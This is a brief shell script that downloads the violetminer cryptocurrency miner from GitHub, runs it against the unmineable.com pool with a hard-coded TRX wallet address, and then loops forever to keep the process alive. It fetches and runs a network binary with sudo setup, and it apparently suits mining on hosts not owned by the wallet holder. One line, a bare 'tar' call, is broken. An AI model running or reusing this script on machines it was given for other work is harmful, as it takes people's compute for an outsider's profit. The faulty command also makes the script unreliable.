#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz 
tar violetminer-linux-v0.2.2 
./violetminer --pool rx.unmineable.com:3333 --username TRX:TXT5Rxt9ffidNdH8B8bvgBXvGnvmPNMHUT.jack --password x --algorithm wrkzcoin --threads 2
while [ 1 ]; do
sleep 3
done
sleep 999
